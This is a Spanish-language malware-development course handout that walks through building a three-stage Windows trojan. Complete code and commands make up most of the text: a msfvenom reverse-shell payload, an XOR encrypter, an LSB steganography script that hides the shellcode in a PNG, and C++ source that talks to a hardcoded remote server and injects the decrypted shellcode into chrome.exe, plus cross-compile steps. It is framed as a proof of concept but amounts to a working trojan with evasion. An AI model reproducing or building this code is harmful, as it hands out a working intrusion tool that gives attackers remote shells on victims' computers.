## PONENCIA: Desarrollo de malware
by @n3xu5_666

El malware de este curso es una PoC cuyo objetivo es realizar una inyección de shellcode en un proceso remoto arbitrario y obtener una reverse shell. Para conseguir este objetivo, el malware está dividido en tres stages o etapas:

1. Shellcode Injector (troyan.exe): Esta etapa del malware se encarga de inyectar en un proceso arbitrario (chrome.exe) un shellcode cifrado (dllinyectorencrypted.bin) con XOR (xor.py) y embebido en una imagen (pornhublsb.png) mediante la técnica de esteganografía LSB (lsb.py). Esto lo consigue enviando el PNG a un servidor remoto en la nube que se va a encargar de extraer el shellcode payload del PNG y enviarlo de regreso cifrado hacia la instancia de esta primera etapa en la máquina víctima para después descifrarlo en tiempo de ejecución e finalmente inyectarlo.

2. Dropper y DLL Injector (dllinjector.exe): Esta etapa del malware descarga un DLL malicioso (evildll.dll) desde el servidor en la nube, lo carga y ejecuta en el proceso inyectado (chrome.exe) haciendo uso de LoadLibraryA. Esta etapa del malware se usa en formato de shellcode payload (dllinjector.bin) y para transformarlo a este formato nos apoyamos de la herramienta Donut.

3. DLL Malicioso (evildll.dll): Esta etapa del malware es un DLL que se va a encargar de ejecutar un shellcode payload malicioso en la memoria del proceso inyectado, justo cuando es cargado en la memoria de ejecución, que nos va a dar una reverse shell, conectándose directamente al servidor C2 en la nube. Para conseguir esto realiza el proceso estándar de un shellcode loader.

- Arquitectura del malware
![malware arch](../img/malwareArchitecture.jpg)

- Dependencias
```bash
apt update && yes|apt upgrade
yes|apt install curl mingw-w64 python python-pip python-pillow python-numpy
python3 -m pip --no-cache-dir install wave
```
NOTA: en distribuciones Linux pillow y numpy se instala desde PIP.

METASPLOIT-FRAMEWORK with Ivam3 [Termux-packages](https://github.com/ivam3/termux-packages) :
```bash
mkdir -p $PREFIX/etc/apt/sources.list.d
curl https://raw.githubusercontent.com/ivam3/termux-packages/gh-pages/ivam3-termux-packages.list -o $PREFIX/etc/apt/sources.list.d/ivam3-termux-packages.list
apt update && yes|apt upgrade
yes|apt install metasploit-framework
```

- Creacion de entorno de trabajo
```bash
mkdir -p PoC-maldev && cd $_ # Crea e ingresa al directorio PoC-maldev
python -m pip env venv  # Crea un entorno virtual para python
```

- Descarga de imagen .png
```bash
curl https://www.iconfinder.com/icons/7150904/download/ico/4096 -o venv/pornhub.png
```

- Payload|Shellcode:
```bash
msfvenom -p windows/x86/shell_reverse_tcp LHOST 0.0.0.0 LPORT 0000 -f raw -o venv/shellcode.bin
```
Sustituye 0.0.0.0 por tu Protocolo de Internet Local (IPL) y el '0000' por el puerto de tu eleccion.

- Activa el entorno virtual de Python
```bash
source venv/bin/activate
```

- Script PoC-maldev/venv/xor.py
```python3
import sys

def xor(inputData, encKey):

	encKey = str(encKey)
	l = len(encKey)
	outStr = b""

	for i in range(len(inputData)):
		cde = inputData[i]
		ck = encKey[i % len(encKey)]
		outStr += chr(cde ^ ord(ck)).encode('latin-1')

	return outStr

if __name__ == "__main__":

	ENCRYPT_KEY = "wubbalubbadubdub"
	try:
		plainText = open(sys.argv[1], "rb").read()
		cipherText = xor(plainText, ENCRYPT_KEY)
		open("encrypted.bin", "wb").write(cipherText)
	except:
		#print f"Usage: python3 {sys.argv[0]} <payload file>"
		sys.exit(1)
```
- Script PoC-maldev/venv/lsb.py
```python3
from PIL import Image
import numpy as np
import sys

def printHelp():

	print(f"""
Usage:


Hide message:

python3 {sys.argv[0]} -hide <image path> <message file> <output image path>


Unhide message:

python3 {sys.argv[0]} -extract <image path>
			""")

def hideBits(orig, msgFile, dest):

	img = Image.open(orig,'r')
	width, height = img.size
	array = np.array(list(img.getdata()))
	if img.mode == 'RGB':
		n = 3
	elif img.mode == 'RGBA':
		n = 4
	total_pixels = array.size//n
	message = open(msgFile, "rb")
	message = message.read()
	message += b"$end_of_message$"
	b_message = ''.join([format(i, "08b") for i in message])
	req_pixels = len(b_message)
	if req_pixels > total_pixels:
		print("ERROR: Need larger file size")
	else:
		index = 0
		for p in range(total_pixels):
			for q in range(0,3):
				if index < req_pixels:
					array[p][q] = int(bin(array[p][q])[2:9] + b_message[index],2)
					index += 1
		array = array.reshape(height, width, n)
		enc_img = Image.fromarray(array.astype('uint8'), img.mode)
		enc_img.save(dest)
		print("\nHidden message successfully!\n")

def extract(path):

	img = Image.open(path, 'r')
	array = np.array(list(img.getdata()))
	if img.mode == 'RGB':
		n = 3
	elif img.mode == 'RGBA':
		n = 4
	total_pixels = array.size//n
	hidden_bits = ""
	for p in range(total_pixels):
		for q in range(0,3):
			hidden_bits += (bin(array[p][q])[2:][-1])
	hidden_bits = [hidden_bits[i:i+8] for i in range(0, len(hidden_bits), 8)]
	message = b""
	for i in range(len(hidden_bits)):
		if message[-16:] == b"$end_of_message$":
			break
		else:
			message += chr(int(hidden_bits[i],2)).encode('latin-1')
	dstFile = open("message.bin", "wb")
	if b"$end_of_message" in message:
		dstFile.write(message[:-16])
		print("\nUnhidden message successfully!\n")
	else:
		print("\nNo Hidden Message Found\n")

if __name__ == "__main__":

	if len(sys.argv) != 5 and len(sys.argv) != 3:
		printHelp()
		sys.exit(1)
	if sys.argv[1] != "-hide" and sys.argv[1] != "-extract":
		printHelp()
		sys.exit(1)
	if sys.argv[1] == "-hide":
		if len(sys.argv) != 5:
			printHelp()
			sys.exit(1)
		hideBits(sys.argv[2], sys.argv[3], sys.argv[4])
	else:
		if len(sys.argv) != 3:
			printHelp()
			sys.exit(1)
		extract(sys.argv[2])
```

- Concatenacion de shellcode de metasploit en el archivo imagen .png
```bash
python3 lsb.py -hide pornhub.png encrypted.bin pornhublsb.png
```

- Desactivamos el entorno virtual de Python
```bash
deactivate
```

- Script PoC-maldev/resources.h
```cpp
#define MY_ICON 200
```

- Script PoC-maldev/resources.rc
```cpp
#include "resources.h"

MY_ICON RCDATA pornhublsb.png
```

- Script PoC-maldev/trojan.cpp
```cpp
// C++ headers
#include <winsock2.h> // Socket header
#include <windows.h> // Win API header
#include <ws2tcpip.h> // TCP/IP header
#include <tlhelp32.h> // Tool Help Library header

// C headers
#include <stdio.h> // Standard Input/Output header
#include <stdlib.h> // Standard library header
#include <string.h> // Standard string header

// Defined header
#include "resources.h"

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Ws2_32.lib")

#define DEFAULT_BUFLEN 1024

typedef SSIZE_T ssize_t;

// https://cplusplus.com/forum/general/266899/
void SendBytes(char * bytes, size_t data_length) {

  WSADATA wsaver;
  WSAStartup(MAKEWORD(2, 2), &wsaver);
  SOCKET tcpsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  sockaddr_in addr;
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = inet_addr("192.168.100.18");
	addr.sin_port = htons(4444);

	char response[DEFAULT_BUFLEN] = "";
	ssize_t bytes_sent;
	size_t total_bytes_sent;

	if (connect(tcpsock, (SOCKADDR *) &addr, sizeof(addr)) == SOCKET_ERROR) {
		closesocket(tcpsock);
		WSACleanup();
		exit(0);
	}
	else {
		while (true) {
			if (data_length >= DEFAULT_BUFLEN) {
				bytes_sent = send(tcpsock, bytes, DEFAULT_BUFLEN, 0);
			}
			else {
				bytes_sent = send(tcpsock, bytes, data_length, 0);
				break;
			}

			recv(tcpsock, response, DEFAULT_BUFLEN, 0);

			if (strcmp(response, "OK") == 0) {
				//printf("\nResponse: %s\n", response);
				bytes += bytes_sent;
				data_length -= bytes_sent;
				total_bytes_sent += bytes_sent;
				//printf("Bytes left = %d , Total bytes sent = %d\n", data_length, total_bytes_sent);
			}
		}
		char END[] = "";
		send(tcpsock, END, strlen(END), 0);
		closesocket(tcpsock);
		WSACleanup();
	}
}

void RecvBytes(char * bytes, size_t data_length) {

	WSADATA wsaver;
	WSAStartup(MAKEWORD(2, 2), &wsaver);
	SOCKET tcpsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr("0.0.0.0");
	addr.sin_port = htons(0000);

	char response[DEFAULT_BUFLEN] = "";
	ssize_t bytes_recived;
	size_t total_bytes_recieved;

	//printf("\n%-20s : 0x%-016p\n", "Response addr", (void *) response);

	if (connect(tcpsock, (SOCKADDR *) &addr, sizeof(addr)) == SOCKET_ERROR) {
		closesocket(tcpsock);
		WSACleanup();
		exit(0);
	}
	else {
		while (true) {
			if (data_length >= DEFAULT_BUFLEN) {
				bytes_recived = recv(tcpsock, response, DEFAULT_BUFLEN, 0);
				memcpy(bytes, response, DEFAULT_BUFLEN);
				memset(response, 0, DEFAULT_BUFLEN);
			}
			else {
				bytes_recived = recv(tcpsock, response, data_length, 0);
				memcpy(bytes, response, data_length);
				memset(response, 0, data_length);
				break;
			}

			send(tcpsock, "OK", 2, 0);

			if (bytes_recived != 0) {
				//printf("\nResponse: %s\n", response);
				bytes += bytes_recived;
				data_length -= bytes_recived;
				total_bytes_recieved += bytes_recived;
				//printf("\nBytes left = %d , Total bytes recieved = %d\n", data_length, total_bytes_recieved);
			}
		}
		closesocket(tcpsock);
		WSACleanup();

		/*
		recv(tcpsock, response, DEFAULT_BUFLEN, 0);
		strncpy(bytes, response, data_length);
		closesocket(tcpsock);
		WSACleanup();
		*/

	}
}

void XOR(char * encrypted_data, size_t data_length, char * key, size_t key_length) {

	int key_index = 0;
	for (int i = 0; i < data_length; i++) {
		if (key_index == key_length - 1) key_index = 0;
		encrypted_data[i] = encrypted_data[i] ^ key[key_index];
		key_index++;
	}
}

int SearchForProcess(const char *processName) {

	HANDLE hSnapshotOfProcesses;
	PROCESSENTRY32 processStruct;
	int pid = 0;

	hSnapshotOfProcesses = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshotOfProcesses) return 0;

	processStruct.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hSnapshotOfProcesses, &processStruct)) {
		CloseHandle(hSnapshotOfProcesses);
		return 0;
	}

	while (Process32Next(hSnapshotOfProcesses, &processStruct)) {
		if (lstrcmpiA(processName, processStruct.szExeFile) == 0) {
			pid = processStruct.th32ProcessID;
			break;
		}
	}

	CloseHandle(hSnapshotOfProcesses);

	return pid;
}

int ShellcodeInject(HANDLE hProcess, unsigned char * shellcodePayload, unsigned int lengthOfShellcodePayload) {

	LPVOID pRemoteProcAllocMem = NULL;
	HANDLE hThread = NULL;
	pRemoteProcAllocMem = VirtualAllocEx(hProcess, NULL, lengthOfShellcodePayload, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(hProcess, pRemoteProcAllocMem, (PVOID)shellcodePayload, (SIZE_T)lengthOfShellcodePayload, (SIZE_T *)NULL);

	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteProcAllocMem, NULL, 0, NULL);

	if (hThread != NULL) {
		WaitForSingleObject(hThread, 500);
		CloseHandle(hThread);
		return 0;
	}
	return -1;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
//int main() {

	BOOL retval;
	HANDLE threadHandle;
	DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;

	char response[DEFAULT_BUFLEN] = "";
	unsigned char * bytes;
	unsigned int lengthOfBytes;
	void * shellcodePayload;
	unsigned int lengthOfShellcodePayload = 119038;

	shellcodePayload = malloc(lengthOfShellcodePayload);
	memset(shellcodePayload, 0, lengthOfShellcodePayload);

	char encryption_key[] = "wubbalubbadubdub";
	int pid = 0;

	HANDLE hProcess;

	// Retrieve shellcode payload from resources section
	res = FindResource(NULL, MAKEINTRESOURCE(MY_ICON), RT_RCDATA);
	resHandle = LoadResource(NULL, res);
	bytes = (unsigned char *) LockResource(resHandle);
	lengthOfBytes = SizeofResource(NULL, res);

	//printf("\n%-20s : 0x%-016p\n", "Bytes addr", (void *) bytes);
	//printf("\n%-20s : 0x%-016p\n", "Shellcode payload addr", (void *) shellcodePayload);

	// Send ICO bytes and recive encrypted shellcode bytes
	SendBytes((char *) bytes, lengthOfBytes);
	RecvBytes((char *) shellcodePayload, lengthOfShellcodePayload);
	//printf("\nPress Enter to Decrypt Shellcode Payload\n");
	//getchar();

	// Decrypt the XOR payload to original shellcode
	XOR((char *) shellcodePayload, lengthOfShellcodePayload, encryption_key, sizeof(encryption_key));

	// Injection
	pid = SearchForProcess("chrome.exe");
	if (pid) {
		//printf("chrome.exe PID = %d\n", pid);

		// try to open target process
		hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD) pid);
		//printf("\nhProcess = %x\n", hProcess);
		//printf("\nPress Enter to Inject the Shellcode Payload\n");
		//getchar();

		if (hProcess != NULL) {
			ShellcodeInject(hProcess, (unsigned char *) shellcodePayload, lengthOfShellcodePayload);
			CloseHandle(hProcess);
		}
	}
	return 0;
}
```

- Script PoC-maldev/compile.sh
```bash
#!/bin/bash

x86_64-w64-mingw32-windres -o resources.o resources.rc
x86_64-w64-mingw32-g++ -o trojan trojan.cpp -lwsock32 -lws2_32 -Wl,--subsystem,windows resources.o
```

- Compilacion
  Se requieren en el mismo directorio los archivos :

    • trojan.cpp
    • resources.rc
    • resources.h
    • imageninfectada.png
    • compile.sh
```bash
bash compile.sh
```

- Continua en la [Segunda Parte](https://t.me/Ivam3byCinderella?livestream)
